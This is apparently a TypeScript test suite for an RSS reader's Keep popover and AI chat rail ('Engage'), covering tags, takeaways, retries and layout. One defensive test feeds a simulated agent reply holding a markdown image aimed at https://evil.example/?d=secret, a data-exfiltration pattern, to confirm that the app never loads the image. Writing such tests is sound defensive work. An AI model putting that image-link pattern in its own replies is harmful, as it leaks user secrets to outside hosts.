// SPDX-License-Identifier: AGPL-3.0-or-later
// Keep (n) and Engage (e), spec §3.1–3.2: the Keep popover, the chat rail, and Keep with this
// conversation.
import { fakeClient, type Routes } from "@jesinia/shell";
import { act, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { App } from "../App";
import { post, routes } from "./fixtures";

class FakeSource {
  static all: FakeSource[] = [];
  listeners = new Map<string, (e: MessageEvent<string>) => void>();
  onerror: (() => void) | null = null;
  constructor(public url: string) {
    FakeSource.all.push(this);
  }
  addEventListener(name: string, fn: (e: MessageEvent<string>) => void) {
    this.listeners.set(name, fn);
  }
  close() {}
}
let seq = 0;
function agent(kind: string, data: Record<string, unknown> = {}) {
  const src = [...FakeSource.all].reverse().find((s) => s.url.includes("/api/agents/sessions/"));
  if (!src) throw new Error("no session stream");
  seq += 1;
  act(() =>
    src.listeners.get(kind)?.(
      new MessageEvent(kind, {
        data: JSON.stringify({ seq, kind, data, origin: "jesinia" }),
        lastEventId: String(seq),
      }),
    ),
  );
}

const NOT_FOUND = { exists: false, canonical: null, near: [], same_meaning: null };
const KEPT = {
  page_id: "pg1",
  path: "Sources/Post 1.md",
  created: true,
  post: post(1, { read: true, kept_page_id: "pg1", archive_state: "archiving" }),
};
const SESSION = {
  id: "s9",
  runner: "claude-code",
  status: "idle",
  model: null,
  read_only: true,
  subject: { kind: "rss", ref: "1", title: "Post 1" },
};

function setup(over: Routes = {}) {
  const env = fakeClient(
    routes({
      "POST /api/kb/tags/suggest": [{ tag: "fly", new: false }],
      "GET /api/kb/tags/check": (req: Request) => {
        const tag = new URL(req.url).searchParams.get("tag");
        return Response.json(
          tag === "sqlites"
            ? { normalised: "sqlites", ...NOT_FOUND, near: ["sqlite"] }
            : { normalised: tag, ...NOT_FOUND },
        );
      },
      "POST /api/rss/posts/1/keep": () => Response.json(KEPT, { status: 201 }),
      "POST /api/rss/posts/1/engage": () => Response.json(SESSION, { status: 201 }),
      "POST /api/agents/sessions/s9/messages": { ok: true },
      "POST /api/rss/sessions/s9/takeaway": {
        text: "Maintenance loses because its success is invisible.",
        agent: "claude-code",
        model: "m1",
        session: "s9",
      },
      ...over,
    }),
  );
  render(<App client={env.client} />);
  return env;
}

const writes = (calls: Request[], path: string) =>
  calls.filter((c) => c.method === "POST" && new URL(c.url).pathname === path);
const press = (key: string, init: KeyboardEventInit = {}) => fireEvent.keyDown(document.body, { key, ...init });
const toast = async (text: RegExp) =>
  (await screen.findAllByText(text)).find((el) => el.closest("[data-toast]") !== null);

/** Open post 1 in the reader. */
async function openFirst() {
  const option = await screen.findByRole("option", { name: /Post 1/ });
  await userEvent.click(option);
  await screen.findByRole("heading", { name: "Post 1", level: 1 });
}

const popover = () => screen.getByRole("dialog", { name: "Keep this post" });
const keepNow = () => userEvent.keyboard("{Meta>}{Enter}{/Meta}");

beforeEach(() => {
  FakeSource.all = [];
  vi.stubGlobal("EventSource", FakeSource);
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.stubGlobal("matchMedia", undefined);
});

describe("Keep popover", () => {
  it("n opens the popover focused on the note", async () => {
    const { calls } = setup();
    await openFirst();
    press("n");
    expect(popover()).toBeInTheDocument();
    expect(screen.getByRole("textbox", { name: "Note" })).toHaveFocus();
    // Suggestions start in the background as it opens; typing is never blocked.
    await waitFor(() => expect(writes(calls, "/api/kb/tags/suggest")).toHaveLength(1));
    expect(await within(popover()).findByRole("button", { name: "#fly" })).toBeInTheDocument();
    // Other keys wait while it is open.
    press("j");
    expect(screen.getByRole("heading", { name: "Post 1", level: 1 })).toBeInTheDocument();
  });

  it("⌘↵ posts note, tags and takeaway", async () => {
    const { calls } = setup();
    await openFirst();
    await userEvent.click(screen.getByRole("button", { name: "Keep" }));
    await userEvent.type(screen.getByRole("textbox", { name: "Note" }), "Worth rereading");
    await userEvent.click(await within(popover()).findByRole("button", { name: "#fly" }));
    await userEvent.click(screen.getByRole("textbox", { name: "Note" }));
    await keepNow();
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(1));
    const req = writes(calls, "/api/rss/posts/1/keep")[0];
    expect(req?.headers.get("Idempotency-Key")).toMatch(/^[0-9a-f-]{36}$/);
    expect(await req?.json()).toEqual({ note: "Worth rereading", tags: ["fly"] });
    expect(await toast(/Kept to Sources\/Post 1\.md\./)).toBeTruthy();
    expect(screen.queryByRole("dialog", { name: "Keep this post" })).toBeNull();
    // The archive status follows from the kept post.
    expect(within(screen.getByRole("region", { name: "Reader" })).getByText("Archiving…")).toBeInTheDocument();
  });

  it("accepts a near-match through TagPicker instead of creating a duplicate", async () => {
    const { calls } = setup();
    await openFirst();
    press("n");
    await userEvent.type(within(popover()).getByRole("textbox", { name: "Add a tag" }), "sqlites{Enter}");
    expect(await within(popover()).findByText("#sqlites looks like an existing tag. Use #sqlite?")).toBeInTheDocument();
    await userEvent.click(within(popover()).getByRole("button", { name: "Use #sqlite" }));
    await userEvent.click(within(popover()).getByRole("button", { name: /^Keep/ }));
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(1));
    expect(await writes(calls, "/api/rss/posts/1/keep")[0]?.json()).toEqual({ note: "", tags: ["sqlite"] });
  });

  it("Esc cancels without writing", async () => {
    const { calls } = setup();
    await openFirst();
    press("n");
    await userEvent.type(screen.getByRole("textbox", { name: "Note" }), "never mind");
    await userEvent.keyboard("{Escape}");
    expect(screen.queryByRole("dialog", { name: "Keep this post" })).toBeNull();
    expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(0);
    press("n"); // a fresh popover
    expect(screen.getByRole("textbox", { name: "Note" })).toHaveValue("");
    await userEvent.click(within(popover()).getByRole("button", { name: "Cancel" }));
    expect(screen.queryByRole("dialog", { name: "Keep this post" })).toBeNull();
  });

  it("shows the cause on failure and keeps what was typed", async () => {
    const { calls } = setup({
      "POST /api/rss/posts/1/keep": () =>
        Response.json({ detail: "The KB is unavailable: the folder is missing" }, { status: 503 }),
    });
    await openFirst();
    press("n");
    await userEvent.type(screen.getByRole("textbox", { name: "Note" }), "Mine");
    await userEvent.keyboard("{Control>}{Enter}{/Control}");
    expect(await within(popover()).findByRole("alert")).toHaveTextContent(
      "Couldn't keep this post: The KB is unavailable: the folder is missing.",
    );
    expect(screen.getByRole("textbox", { name: "Note" })).toHaveValue("Mine");
    // R25: retrying the same Keep is the same action, so it carries the same key (a lost
    // answer then never appends the note twice); an edit makes it a new action.
    await keepNow();
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(2));
    await userEvent.type(screen.getByRole("textbox", { name: "Note" }), " too");
    await keepNow();
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(3));
    const keys = writes(calls, "/api/rss/posts/1/keep").map((c) => c.headers.get("Idempotency-Key"));
    expect(keys[1]).toBe(keys[0]);
    expect(keys[2]).not.toBe(keys[0]);
  });

  it("a second ⌘↵ while keeping sends nothing more; a failed request says why", async () => {
    let release: (r: Response) => void = () => {};
    let attempt = 0;
    const { calls } = setup({
      "POST /api/rss/posts/1/keep": () => {
        attempt += 1;
        if (attempt === 1) return new Promise<Response>((resolve) => (release = resolve));
        return Promise.reject("connection refused"); // not an Error: its text is the cause
      },
    });
    await openFirst();
    press("n");
    await keepNow();
    await keepNow();
    expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(1);
    await act(async () => release(Response.json({ detail: "busy" }, { status: 409 })));
    expect(await within(popover()).findByRole("alert")).toHaveTextContent("Couldn't keep this post: busy.");
    await keepNow();
    expect(await within(popover()).findByRole("alert")).toHaveTextContent(
      "Couldn't keep this post: Jesinia didn't answer (connection refused). Check that Jesinia is running, then try again.",
    );
  });

  it("⌘↵ commits a tag still typed in Add a tag, then keeps", async () => {
    const { calls } = setup();
    await openFirst();
    press("n");
    await userEvent.type(within(popover()).getByRole("textbox", { name: "Add a tag" }), "wal-mode");
    await keepNow();
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(1));
    expect(await writes(calls, "/api/rss/posts/1/keep")[0]?.json()).toEqual({ note: "", tags: ["wal-mode"] });
  });

  it("⌘↵ with a typed near-duplicate stops to ask, and keeps nothing yet", async () => {
    const { calls } = setup();
    await openFirst();
    press("n");
    await userEvent.type(within(popover()).getByRole("textbox", { name: "Add a tag" }), "sqlites");
    await keepNow();
    expect(await within(popover()).findByText("#sqlites looks like an existing tag. Use #sqlite?")).toBeInTheDocument();
    expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(0);
  });

  it("holds focus: Tab cycles inside, Esc cancels even from outside, focus returns", async () => {
    setup();
    await openFirst();
    const keepButton = screen.getByRole("button", { name: "Keep" });
    keepButton.focus();
    await userEvent.keyboard("{Enter}");
    const note = screen.getByRole("textbox", { name: "Note" });
    expect(note).toHaveFocus();
    expect(popover()).toHaveAttribute("aria-modal", "true");
    const last = within(popover()).getByRole("button", { name: /^Keep/ });
    last.focus();
    await userEvent.tab();
    expect(note).toHaveFocus();
    await userEvent.tab({ shift: true });
    expect(last).toHaveFocus();
    act(() => (document.activeElement as HTMLElement).blur());
    fireEvent.keyDown(document.body, { key: "Escape" });
    expect(screen.queryByRole("dialog", { name: "Keep this post" })).toBeNull();
    expect(keepButton).toHaveFocus();
  });

  it("the Keep shortcut is announced, not read as part of the name; the takeaway is bounded", async () => {
    setup();
    await openFirst();
    press("n");
    const keep = within(popover()).getByRole("button", { name: "Keep" });
    expect(keep).toHaveAttribute("aria-keyshortcuts", "Meta+Enter Control+Enter");
  });

  it("archive status updates live from rss.post_changed", async () => {
    setup();
    await openFirst();
    press("n");
    await keepNow();
    const reader = () => screen.getByRole("region", { name: "Reader" });
    expect(await within(reader()).findByText("Archiving…")).toBeInTheDocument();
    const events = FakeSource.all.find((s) => s.url.includes("rss.post_changed"));
    if (!events) throw new Error("no rss.post_changed stream");
    const send = (data: object) =>
      act(() =>
        events.listeners.get("rss.post_changed")?.(
          new MessageEvent("rss.post_changed", { data: JSON.stringify(data), lastEventId: String(++seq) }),
        ),
      );
    send({ id: 1, archive_state: "failed", archive_error: "the site answered 503" });
    expect(within(reader()).getByText("Archive incomplete: the site answered 503.")).toBeInTheDocument();
    send({ id: 99, archive_state: "done", archive_error: null }); // not in the list: ignored
    send({ id: 1, archive_state: "done", archive_error: null });
    expect(within(reader()).getByRole("status")).toHaveTextContent("In KB");
  });

  it("an archive that ends before Keep answers still shows its end", async () => {
    let answer: (r: Response) => void = () => {};
    setup({ "POST /api/rss/posts/1/keep": () => new Promise<Response>((resolve) => (answer = resolve)) });
    await openFirst();
    press("n");
    await keepNow();
    const events = FakeSource.all.find((s) => s.url.includes("rss.post_changed"));
    const send = (data: object) =>
      act(() =>
        events?.listeners.get("rss.post_changed")?.(
          new MessageEvent("rss.post_changed", { data: JSON.stringify(data), lastEventId: String(++seq) }),
        ),
      );
    send({ id: 2, archive_state: "done", archive_error: null }); // another post: no effect on this one
    send({ id: 1, archive_state: "done", archive_error: null });
    await act(async () => answer(Response.json(KEPT, { status: 201 }))); // says "archiving"
    const reader = screen.getByRole("region", { name: "Reader" });
    expect(within(reader).getByRole("status")).toHaveTextContent("In KB");
  });

  it("a mark-read answer never takes the archive back to an older state", async () => {
    let answer: (r: Response) => void = () => {};
    setup({
      "PATCH /api/rss/posts/1": () => new Promise<Response>((resolve) => (answer = resolve)),
    });
    await openFirst();
    press("n");
    await keepNow();
    const reader = () => screen.getByRole("region", { name: "Reader" });
    expect(await within(reader()).findByText("Archiving…")).toBeInTheDocument();
    press("m"); // mark unread: the answer is held back
    const events = FakeSource.all.find((s) => s.url.includes("rss.post_changed"));
    act(() =>
      events?.listeners.get("rss.post_changed")?.(
        new MessageEvent("rss.post_changed", {
          data: JSON.stringify({ id: 1, archive_state: "done", archive_error: null }),
          lastEventId: String(++seq),
        }),
      ),
    );
    // Sent before the archive finished, the answer still says "archiving".
    const stale = post(1, { read: false, kept_page_id: "pg1", archive_state: "archiving" });
    await act(async () => answer(Response.json(stale)));
    expect(within(reader()).getByRole("status")).toHaveTextContent("In KB");
  });

  it("says suggestions come from the catalog only when no agent is available", async () => {
    setup({ "GET /api/agents/runners": { codex: { available: false, version: null, detail: "x" } } });
    await openFirst();
    await waitFor(() => {
      press("n");
      expect(
        within(popover()).getByText("Suggestions from your catalog only (no agent available)."),
      ).toBeInTheDocument();
    });
  });

  it("n with no post open does nothing", async () => {
    setup();
    await screen.findByRole("option", { name: /Post 1/ });
    press("n");
    press("e");
    expect(screen.queryByRole("dialog")).toBeNull();
    expect(screen.queryByRole("complementary", { name: "Chat about this post" })).toBeNull();
  });
});

describe("Engage", () => {
  it("opens the rail and creates a session", async () => {
    const { calls } = setup();
    await openFirst();
    await waitFor(() => expect(screen.getByRole("button", { name: "Engage" })).toBeEnabled());
    press("e");
    const rail = await screen.findByRole("complementary", { name: "Chat about this post" });
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1));
    const req = writes(calls, "/api/rss/posts/1/engage")[0];
    expect(req?.headers.get("Idempotency-Key")).toMatch(/^[0-9a-f-]{36}$/);
    expect(await req?.json()).toEqual({ runner: "claude-code" });
    await waitFor(() =>
      expect(FakeSource.all.some((s) => s.url.includes("/api/agents/sessions/s9/events"))).toBe(true),
    );
    expect(within(rail).getByRole("combobox", { name: "Runner" })).toBeDisabled();
    await userEvent.type(within(rail).getByRole("textbox", { name: "Message" }), "How does this connect?{Enter}");
    await waitFor(() => expect(writes(calls, "/api/agents/sessions/s9/messages")).toHaveLength(1));
    agent("user_message", { text: "How does this connect?" });
    press("e"); // already open: no second session
    expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1);
    await userEvent.click(within(rail).getByRole("button", { name: "Close chat" }));
    expect(screen.queryByRole("complementary", { name: "Chat about this post" })).toBeNull();
    expect(screen.getByRole("button", { name: "Engage" })).toHaveAttribute("aria-pressed", "false");
    // Engage again returns to the same conversation.
    press("e");
    const again = await screen.findByRole("complementary", { name: "Chat about this post" });
    expect(within(again).getByText("How does this connect?")).toBeInTheDocument();
    expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1);
  });

  it("a message sent while the session is still being created goes to that one session", async () => {
    let created: (r: Response) => void = () => {};
    const { calls } = setup({
      "POST /api/rss/posts/1/engage": () => new Promise<Response>((resolve) => (created = resolve)),
    });
    await openFirst();
    await waitFor(() => expect(screen.getByRole("button", { name: "Engage" })).toBeEnabled());
    press("e");
    const rail = await screen.findByRole("complementary", { name: "Chat about this post" });
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1));
    await userEvent.type(within(rail).getByRole("textbox", { name: "Message" }), "Quick question{Enter}");
    expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1); // the send waits for it
    await act(async () => created(Response.json(SESSION, { status: 201 })));
    await waitFor(() => expect(writes(calls, "/api/agents/sessions/s9/messages")).toHaveLength(1));
    expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1);
    await waitFor(() =>
      expect(FakeSource.all.some((s) => s.url.includes("/api/agents/sessions/s9/events"))).toBe(true),
    );
  });

  it("a failed session start is tried again by the next message", async () => {
    let fail = true;
    const { calls } = setup({
      "POST /api/rss/posts/1/engage": () =>
        fail ? Response.json({ detail: "runner busy" }, { status: 409 }) : Response.json(SESSION, { status: 201 }),
    });
    await openFirst();
    await waitFor(() => expect(screen.getByRole("button", { name: "Engage" })).toBeEnabled());
    press("e");
    const rail = await screen.findByRole("complementary", { name: "Chat about this post" });
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1));
    await toast(/Couldn't start the chat/);
    fail = false;
    await userEvent.type(within(rail).getByRole("textbox", { name: "Message" }), "Again{Enter}");
    await waitFor(() => expect(writes(calls, "/api/agents/sessions/s9/messages")).toHaveLength(1));
    expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(2);
  });

  it("Keep with this conversation shows an editable takeaway", async () => {
    const { calls } = setup();
    await openFirst();
    await userEvent.click(screen.getByRole("button", { name: "Engage" }));
    const rail = await screen.findByRole("complementary", { name: "Chat about this post" });
    // Offered once there is a session, and usable once the agent has answered.
    const keepWith = await within(rail).findByRole("button", { name: "Keep with this conversation" });
    expect(keepWith).toBeDisabled();
    await waitFor(() => expect(FakeSource.all.some((s) => s.url.includes("/sessions/s9/"))).toBe(true));
    agent("user_message", { text: "Tie this to my tech-debt notes" });
    agent("text", { text: "Your ledger page argues debt is fine if tracked." });
    agent("turn_done", { model: "m1" });
    await waitFor(() => expect(keepWith).toBeEnabled());
    await userEvent.click(keepWith);
    const req = writes(calls, "/api/rss/sessions/s9/takeaway")[0];
    expect(req?.headers.get("Idempotency-Key")).toMatch(/^[0-9a-f-]{36}$/);
    const takeaway = await within(await screen.findByRole("dialog", { name: "Keep this post" })).findByRole("textbox", {
      name: "Takeaway",
    });
    expect(takeaway).toHaveValue("Maintenance loses because its success is invisible.");
    expect(takeaway).toHaveAttribute("maxLength", "2000");
    expect(screen.getByRole("textbox", { name: "Note" })).toHaveValue("Tie this to my tech-debt notes");
    // Cancel, and ask again after the takeaway turn: the note is still the author's.
    await userEvent.keyboard("{Escape}");
    agent("user_message", { text: "The user is keeping this post. Write the takeaway.", purpose: "takeaway" });
    agent("text", { text: "Maintenance loses because\n its success is invisible." });
    agent("turn_done", { model: "m1" });
    // R26: the app's prompt is not shown as the author's message.
    expect(within(rail).queryByText(/The user is keeping this post/)).toBeNull();
    await userEvent.click(keepWith);
    await waitFor(() => expect(writes(calls, "/api/rss/sessions/s9/takeaway")).toHaveLength(2));
    const again = await screen.findByRole("textbox", { name: "Takeaway" });
    expect(screen.getByRole("textbox", { name: "Note" })).toHaveValue("Tie this to my tech-debt notes");
    await userEvent.clear(again);
    await userEvent.type(again, "Invisible success is hard to fund.");
    await keepNow();
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(1));
    expect(await writes(calls, "/api/rss/posts/1/keep")[0]?.json()).toEqual({
      note: "Tie this to my tech-debt notes",
      tags: [],
      takeaway: { text: "Invisible success is hard to fund.", session: "s9" },
    });
  });

  it("an agent reply never loads an image (R24)", async () => {
    setup();
    await openFirst();
    press("e");
    const rail = await screen.findByRole("complementary", { name: "Chat about this post" });
    await waitFor(() => expect(FakeSource.all.some((s) => s.url.includes("/sessions/s9/"))).toBe(true));
    agent("user_message", { text: "Q" });
    agent("text", { text: "Look: ![x](https://evil.example/?d=secret) and [docs](https://evil.example/p)" });
    agent("turn_done", {});
    expect(await within(rail).findByText(/x \(evil\.example\)/)).toBeInTheDocument();
    expect(rail.querySelector("img")).toBeNull();
    const link = within(rail).getByRole("link", { name: "docs" });
    expect(link).toHaveAttribute("title", "https://evil.example/p");
    expect(link).toHaveAttribute("rel", "noopener noreferrer nofollow");
  });

  it("asking again while the popover is open shows the new takeaway", async () => {
    let n = 0;
    setup({
      "POST /api/rss/sessions/s9/takeaway": () =>
        Response.json({ text: `Takeaway ${++n}.`, agent: "claude-code", model: "m1", session: "s9" }),
    });
    await openFirst();
    press("e");
    const rail = await screen.findByRole("complementary", { name: "Chat about this post" });
    await waitFor(() => expect(FakeSource.all.some((s) => s.url.includes("/sessions/s9/"))).toBe(true));
    agent("user_message", { text: "Q" });
    agent("text", { text: "A" });
    agent("turn_done", {});
    const keepWith = within(rail).getByRole("button", { name: "Keep with this conversation" });
    await userEvent.click(keepWith);
    expect(await screen.findByRole("textbox", { name: "Takeaway" })).toHaveValue("Takeaway 1.");
    await userEvent.click(keepWith);
    await waitFor(() => expect(screen.getByRole("textbox", { name: "Takeaway" })).toHaveValue("Takeaway 2."));
  });

  it("a cleared takeaway is left out, and a failed takeaway says why", async () => {
    let fail = true;
    const { calls } = setup({
      "POST /api/rss/sessions/s9/takeaway": () =>
        fail
          ? Response.json({ detail: "the agent is still answering; try again when it is done" }, { status: 409 })
          : Response.json({ text: "Short.", agent: "claude-code", model: "m1", session: "s9" }),
    });
    await openFirst();
    press("e");
    const rail = await screen.findByRole("complementary", { name: "Chat about this post" });
    await waitFor(() => expect(FakeSource.all.some((s) => s.url.includes("/sessions/s9/"))).toBe(true));
    agent("user_message", { text: "Q" });
    agent("text", { text: "A" });
    agent("turn_done", {});
    await userEvent.click(within(rail).getByRole("button", { name: "Keep with this conversation" }));
    expect(
      await toast(/Couldn't get a takeaway: the agent is still answering; try again when it is done\./),
    ).toBeTruthy();
    expect(screen.queryByRole("dialog", { name: "Keep this post" })).toBeNull();
    // The failed takeaway turn ran (marked) and stopped: the note is still the author's.
    agent("user_message", { text: "The user is keeping this post. Write the takeaway.", purpose: "takeaway" });
    agent("error", { message: "the turn timed out" });
    fail = false;
    await userEvent.click(within(rail).getByRole("button", { name: "Keep with this conversation" }));
    await userEvent.clear(await screen.findByRole("textbox", { name: "Takeaway" }));
    await keepNow();
    await waitFor(() => expect(writes(calls, "/api/rss/posts/1/keep")).toHaveLength(1));
    expect(await writes(calls, "/api/rss/posts/1/keep")[0]?.json()).toEqual({ note: "Q", tags: [] });
  });

  it("a session that can't start says why; the rail closes when another post opens", async () => {
    setup({
      "POST /api/rss/posts/1/engage": () => Response.json({ detail: "runner claude-code is busy" }, { status: 409 }),
    });
    await openFirst();
    press("e");
    expect(await toast(/Couldn't start the chat: runner claude-code is busy\./)).toBeTruthy();
    expect(screen.getByRole("complementary", { name: "Chat about this post" })).toBeInTheDocument();
    press("j");
    await screen.findByRole("heading", { name: "Post 2", level: 1 });
    expect(screen.queryByRole("complementary", { name: "Chat about this post" })).toBeNull();
  });

  it("a session that answers after another post opened is let go, and so is its failure", async () => {
    const answers: ((r: Response) => void)[] = [];
    const { calls } = setup({
      "POST /api/rss/posts/1/engage": () => new Promise<Response>((resolve) => answers.push(resolve)),
      "POST /api/rss/posts/2/engage": () => new Promise<Response>((resolve) => answers.push(resolve)),
    });
    await openFirst();
    press("e");
    await waitFor(() => expect(answers).toHaveLength(1));
    press("j");
    await screen.findByRole("heading", { name: "Post 2", level: 1 });
    await act(async () => answers[0]?.(Response.json(SESSION, { status: 201 })));
    press("e");
    await waitFor(() => expect(answers).toHaveLength(2));
    press("k");
    await screen.findByRole("heading", { name: "Post 1", level: 1 });
    await act(async () => answers[1]?.(Response.json({ detail: "runner gone" }, { status: 409 })));
    expect(FakeSource.all.some((s) => s.url.includes("/api/agents/sessions/"))).toBe(false);
    expect(screen.queryByText(/Couldn't start the chat/)).toBeNull();
    expect(screen.queryByRole("complementary", { name: "Chat about this post" })).toBeNull();
    expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(1);
  });

  it("opening another post closes the Keep popover", async () => {
    setup();
    await openFirst();
    press("n");
    await userEvent.click(screen.getByRole("option", { name: /Post 2/ }));
    await screen.findByRole("heading", { name: "Post 2", level: 1 });
    expect(screen.queryByRole("dialog", { name: "Keep this post" })).toBeNull();
  });

  it("with no agent, the rail opens without a session and says so", async () => {
    const { calls } = setup({ "GET /api/agents/runners": { codex: { available: false, version: null, detail: "x" } } });
    await openFirst();
    await waitFor(() => {
      press("e");
      expect(screen.getByRole("complementary", { name: "Chat about this post" })).toHaveTextContent(
        /No agent is available/,
      );
    });
    expect(writes(calls, "/api/rss/posts/1/engage")).toHaveLength(0);
  });

  it("on a narrow screen the chat is a sheet over the reader; Done returns", async () => {
    const listeners = new Set<() => void>();
    const mql = {
      matches: true,
      media: "(max-width: 767px)",
      addEventListener: (_: string, fn: () => void) => listeners.add(fn),
      removeEventListener: (_: string, fn: () => void) => listeners.delete(fn),
    };
    vi.stubGlobal("matchMedia", () => mql);
    setup();
    await openFirst();
    press("e");
    const sheet = await screen.findByRole("dialog", { name: "Chat about this post" });
    expect(within(sheet).getByRole("complementary", { name: "Chat about this post" })).toBeInTheDocument();
    // The sheet takes focus to its message box.
    await waitFor(() => expect(within(sheet).getByRole("textbox", { name: "Message" })).toHaveFocus());
    await waitFor(() => expect(FakeSource.all.some((s) => s.url.includes("/sessions/s9/"))).toBe(true));
    agent("user_message", { text: "Kept question" });
    await userEvent.click(within(sheet).getByRole("button", { name: "Done" }));
    expect(screen.queryByRole("dialog", { name: "Chat about this post" })).toBeNull();
    expect(screen.getByRole("heading", { name: "Post 1", level: 1 })).toBeInTheDocument();
    // The chat keeps its state.
    await userEvent.click(screen.getByRole("button", { name: "Engage" }));
    const reopened = await screen.findByRole("dialog", { name: "Chat about this post" });
    expect(within(reopened).getByText("Kept question")).toBeInTheDocument();
    // Esc is Done.
    fireEvent.keyDown(within(reopened).getByRole("textbox", { name: "Message" }), { key: "Escape" });
    expect(screen.queryByRole("dialog", { name: "Chat about this post" })).toBeNull();
    await userEvent.click(screen.getByRole("button", { name: "Engage" }));
    // Keep with this conversation puts the popover in front: the sheet steps aside.
    agent("text", { text: "An answer." });
    agent("turn_done", {});
    await userEvent.click(within(reopened).getByRole("button", { name: "Keep with this conversation" }));
    expect(await screen.findByRole("dialog", { name: "Keep this post" })).toBeInTheDocument();
    expect(screen.queryByRole("dialog", { name: "Chat about this post" })).toBeNull();
    await userEvent.keyboard("{Escape}");
    await userEvent.click(screen.getByRole("button", { name: "Engage" }));
    // Widening turns the sheet into the rail, with the same transcript.
    mql.matches = false;
    act(() => listeners.forEach((fn) => fn()));
    expect(screen.queryByRole("dialog", { name: "Chat about this post" })).toBeNull();
    const rail = screen.getByRole("complementary", { name: "Chat about this post" });
    expect(within(rail).getByText("Kept question")).toBeInTheDocument();
  });
});
